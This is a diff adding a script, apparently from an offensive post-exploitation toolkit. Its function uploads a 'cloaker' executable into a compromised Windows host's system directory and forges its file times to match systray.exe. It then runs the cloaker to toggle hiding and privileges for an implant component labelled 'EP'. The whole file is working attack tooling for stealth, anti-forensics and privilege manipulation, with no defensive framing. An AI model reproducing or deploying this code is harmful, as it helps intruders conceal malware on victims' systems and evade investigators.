@@ -1,0 +1,46 @@
+# args: <cloaker_exe> <resdir>  <s> - stop hiding
+#		      		<e> - make EP privileged
+#		                <d> - take away EP privileges
+@include "_GetSystemPaths.epm";
+sub cloakIt(IN string $helperFile, IN string $resPath, IN string $action)
+{
+  string $system;
+  string $root;
+
+  ifnot (_GetSystemPaths($system, $root)) {
+    echo "* Unable to determine system root";
+    return false;
+  }
+  string $systemroot = "$system\\$root"; 
+  string $path = "$systemroot\\$helperFile";
+  
+  ifnot(`checkfile -name "$path"`) {
+    echo "$path not found";
+
+    echo "Uploading cloaker";
+    
+    ifnot(`put "$resPath\\uncloak.exe" -name "$path"`) {
+      echo "Couldn't upload cloaker ";
+      return false;
+    }
+    
+    
+    echo "Matching file time for cloaker program";
+    if (`matchtimes "$systemroot\\systray.exe" "$path"`) {
+      echo "    SUCCESS";
+    } 
+    else {
+      echo "    FAILED (but continuing anyway)";
+    }
+  }
+  @record on;
+  `run -command "$path $action" -redirect`;
+  @record off;
+  string $rv = GetCmdData("output");
+  if($rv != "0") {
+    echo "Couldn't perform requested cloak operation: $action";
+    return false;
+  }
+  return true;
+}
+
